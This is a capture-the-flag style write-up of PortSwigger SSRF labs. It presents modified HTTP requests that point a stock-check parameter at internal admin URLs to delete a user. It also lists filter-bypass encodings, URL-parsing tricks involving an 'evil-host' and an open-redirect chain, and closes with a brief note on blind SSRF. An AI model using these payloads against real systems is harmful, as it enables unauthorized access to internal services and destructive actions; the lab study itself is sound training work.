---
title: PortSwigger - Server Side Request Forgery
date: '2024-05-10'
tags: ['PortSwigger', 'PortSwigger Labs', 'Web Security']
draft: false
summary: 
---

#### Basic SSRF against the local server
This is a very simple lab. The following request contains an ssrf vulnerability :
```http
POST /product/stock HTTP/2
Host: 0a5100bb03996a16845a09d4002600ba.web-security-academy.net
Cookie: session=512svTNLynrTWILxUFFWzCa1E5YOIxny
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a5100bb03996a16845a09d4002600ba.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a5100bb03996a16845a09d4002600ba.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
```

Change it to :

```http
POST /product/stock HTTP/2
Host: 0a5100bb03996a16845a09d4002600ba.web-security-academy.net
Cookie: session=512svTNLynrTWILxUFFWzCa1E5YOIxny
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a5100bb03996a16845a09d4002600ba.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: https://0a5100bb03996a16845a09d4002600ba.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http://localhost/admin/delete?username=carlos
```

#### Basic SSRF against another back-end system

In this lab we don't know the exact IP address where the admin interface is hosted, so we try to send the request to intruder and enumerate the last octet of the IP address. Based on the responses we will know the correct IP address.


#### SSRF with blacklist-based input filter
Use the following
- `127.0.0.1`
- `2130706433`
- `017700000001`
- `127.1`
- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.

We try `http://127.0.0.1` , it does not work. `http://127.1/admin` still nothing.
double Url encoding helps us bypass blacklist : `http://127.1/%2561dmin`

```http
POST /product/stock HTTP/2
Host: 0afb00d5041978db80486268009b00eb.web-security-academy.net
Cookie: session=ZBpeHMBlmyUuCjKLeM3sPdnjVqFu7fL3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0afb00d5041978db80486268009b00eb.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: https://0afb00d5041978db80486268009b00eb.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http://127.1/%2561dmin/delete?username=carlos
```

#### SSRF with whitelist-based input filter
- `https://expected-host:fakepassword@evil-host`
- `https://evil-host#expected-host`
- `https://expected-host.evil-host`
- We can also url encode characters
- Try double encoding


First we try
`127.0.0.1`
`http://username@stock.weliketoshop.net/`
`http://username#@stock.weliketoshop.net` gets 500 indicating server tried to process it
`http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`

```http
POST /product/stock HTTP/2
Host: 0abf00f103d094638071e98800b80003.web-security-academy.net
Cookie: session=qUtEdcYQ2iug1VhMOV2FBBTKSYIay0Qy
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0abf00f103d094638071e98800b80003.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Origin: https://0abf00f103d094638071e98800b80003.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

#### SSRF with filter bypass via open redirection vulnerability
The parameter `path` is vulnerable to open redirection


```http
POST /product/stock HTTP/2
Host: 0a3f000304fbb6608052677b00d500d9.web-security-academy.net
Cookie: session=JkfUpvwXo2g8Ycg6pLD0pHNfdeNtQXWl
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3f000304fbb6608052677b00d500d9.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Origin: https://0a3f000304fbb6608052677b00d500d9.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos
```



---

# Blind SSRF

When the response of a SSRF vulnerability is not received on attackers end. It is common when testing for SSRF vulnerabilities to observe a DNS look-up for the supplied Collaborator domain, but no subsequent HTTP request. This typically happens because the application attempted to make an HTTP request to the domain, which caused the initial DNS lookup, but the actual HTTP request was blocked by network-level filtering. It is relatively common for infrastructure to allow outbound DNS traffic, since this is needed for so many purposes, but block HTTP connections to unexpected destinations.

